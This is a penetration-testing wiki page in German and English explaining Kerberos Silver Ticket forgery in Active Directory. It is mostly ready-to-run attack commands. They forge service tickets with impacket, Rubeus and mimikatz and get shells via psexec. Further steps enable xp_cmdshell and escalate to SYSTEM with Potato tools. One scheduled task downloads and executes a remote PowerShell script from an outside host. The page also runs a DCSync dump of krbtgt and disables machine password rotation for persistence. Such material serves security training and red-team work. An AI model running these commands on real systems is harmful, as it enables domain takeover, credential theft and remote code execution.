# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Der **Silver Ticket**-Angriff beinhaltet die Ausnutzung von Service-Tickets in Active Directory (AD)-Umgebungen. Diese Methode basiert darauf, den **NTLM hash of a service account** zu erlangen, etwa eines computer account, um ein Ticket Granting Service (TGS)-Ticket zu fälschen. Mit diesem gefälschten Ticket kann ein Angreifer auf bestimmte Dienste im Netzwerk zugreifen und sich **als beliebiger Benutzer ausgeben**, wobei typischerweise administrative Rechte angestrebt werden. Es wird betont, dass die Verwendung von AES keys zum Fälschen von Tickets sicherer und weniger erkennbar ist.

> [!WARNING]
> Silver Tickets are less detectable than Golden Tickets because they only require the **hash of the service account**, not the krbtgt account. However, they are limited to the specific service they target. Moreover, just stealing the password of a user.
> Moreover, if you compromise an **account's password with a SPN** you can use that password to create a Silver Ticket impersonating any user to that service.

For ticket crafting, different tools are employed based on the operating system:

### Unter Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Unter Windows
```bash
# Using Rubeus
## /ldap option is used to get domain data automatically
## With /ptt we already load the tickt in memory
rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd

# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Der CIFS-Dienst wird als häufiges Ziel hervorgehoben, um auf das Dateisystem des Opfers zuzugreifen, aber andere Dienste wie HOST und RPCSS können ebenfalls für Aufgaben und WMI-Abfragen ausgenutzt werden.

### Beispiel: MSSQL service (MSSQLSvc) + Potato to SYSTEM

Wenn Sie den NTLM-Hash (oder AES key) eines SQL service account (z. B. sqlsvc) haben, können Sie ein TGS für den MSSQL SPN fälschen und sich gegenüber dem SQL service als beliebiger Benutzer ausgeben. Von dort aus aktivieren Sie xp_cmdshell, um Befehle als SQL service account auszuführen. Wenn dieses Token SeImpersonatePrivilege besitzt, nutzen Sie eine Potato, um auf SYSTEM zu erhöhen.
```bash
# Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Wenn der resultierende Kontext SeImpersonatePrivilege hat (oft zutreffend bei service accounts), verwende eine Potato variant, um SYSTEM zu erhalten:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
Mehr Details zum Missbrauch von MSSQL und zum Aktivieren von xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Potato techniques Übersicht:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Verfügbare Dienste

| Diensttyp                                  | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Depending on OS also:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In some occasions you can just ask for: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Using **Rubeus** you may **ask for all** these tickets using the parameter:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets Ereignis-IDs

- 4624: Account Logon
- 4634: Account Logoff
- 4672: Admin Logon

## Persistenz

Damit Maschinen ihre Passwörter nicht alle 30 Tage rotieren, setze `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` oder du kannst `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` auf einen Wert größer als 30 Tage setzen, um den Rotationszeitraum anzugeben.

## Missbrauch von Service tickets

In den folgenden Beispielen nehmen wir an, dass das Ticket unter Impersonation des Administrator-Accounts erlangt wurde.

### CIFS

Mit diesem Ticket kannst du auf die Ordner `C$` und `ADMIN$` über **SMB** zugreifen (falls sie erreichbar sind) und Dateien in Teile des entfernten Dateisystems kopieren, indem du etwa Folgendes ausführst:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Sie können außerdem eine Shell auf dem Host erhalten oder beliebige Befehle mit **psexec** ausführen:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Mit dieser Berechtigung können Sie geplante Aufgaben auf entfernten Computern erstellen und beliebige Befehle ausführen:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Mit diesen Tickets kannst du **WMI im Zielsystem ausführen**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Finden Sie **mehr Informationen über wmiexec** auf der folgenden Seite:

{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Mit winrm-Zugriff auf einen Computer können Sie **darauf zugreifen** und sogar eine PowerShell erhalten:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Schau dir die folgende Seite an, um **weitere Möglichkeiten kennenzulernen, mit winrm eine Verbindung zu einem Remote-Host herzustellen**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Beachte, dass **winrm auf dem Remote-Computer aktiv sein und auf eingehende Verbindungen hören muss**, um darauf zuzugreifen.

### LDAP

Mit diesem Privileg kannst du die DC-Datenbank mit **DCSync** auslesen:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Erfahren Sie mehr über DCSync** auf der folgenden Seite:


{{#ref}}
dcsync.md
{{#endref}}


## Referenzen

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)



{{#include ../../banners/hacktricks-training.md}}
